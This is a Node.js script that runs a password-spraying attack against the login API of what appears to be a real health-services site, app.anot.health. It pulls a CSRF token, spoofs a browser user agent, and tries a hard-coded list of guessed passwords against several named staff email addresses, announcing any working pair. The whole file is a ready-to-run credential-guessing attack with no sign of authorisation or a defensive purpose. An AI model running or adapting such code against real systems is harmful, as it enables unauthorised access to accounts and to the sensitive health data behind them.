const https = require('https');

const passwords = ['#1Knowtex2026', 'Password@2026', '#1Augmedix2026', 'Anot@2026', 'Secret@2026'];
const emails = ['sahib@anot.health', 'shahib@anot.health', 'scribe@anot.health'];

async function testCred(email, password) {
  return new Promise((resolve) => {
    const cReq = https.request({
      hostname: 'app.anot.health',
      path: '/api/csrf-token',
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': 'application/json',
        'Origin': 'https://app.anot.health',
        'Referer': 'https://app.anot.health/',
      },
    }, (cRes) => {
      let d = '';
      const sc = (cRes.headers['set-cookie'] || []).map(c => c.split(';')[0]).join('; ');
      cRes.on('data', chunk => d += chunk);
      cRes.on('end', () => {
        let csrf = '';
        try { csrf = JSON.parse(d).csrfToken; } catch (_) {}
        const lReq = https.request({
          hostname: 'app.anot.health',
          path: '/api/auth/login',
          method: 'POST',
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': 'application/json',
            'Origin': 'https://app.anot.health',
            'Referer': 'https://app.anot.health/',
            'Content-Type': 'application/json',
            'Cookie': sc,
            'X-CSRF-Token': csrf,
          },
        }, (lRes) => {
          let ld = '';
          lRes.on('data', chunk => ld += chunk);
          lRes.on('end', () => {
            let body = {};
            try { body = JSON.parse(ld); } catch (_) {}
            console.log(`[${lRes.statusCode}] ${email.padEnd(22)} | Pass: ${password.padEnd(16)} | Message: ${body.message || body.error || 'unknown'}`);
            resolve({ ok: lRes.statusCode === 200, user: body.user });
          });
        });
        lReq.write(JSON.stringify({ email, password, force: true }));
        lReq.end();
      });
    });
    cReq.end();
  });
}

(async () => {
  for (const email of emails) {
    for (const pass of passwords) {
      const res = await testCred(email, pass);
      if (res.ok) {
        console.log(`\n🎯 FOUND WORKING SCRIBE: ${email} / ${pass}`);
        return;
      }
    }
  }
})();
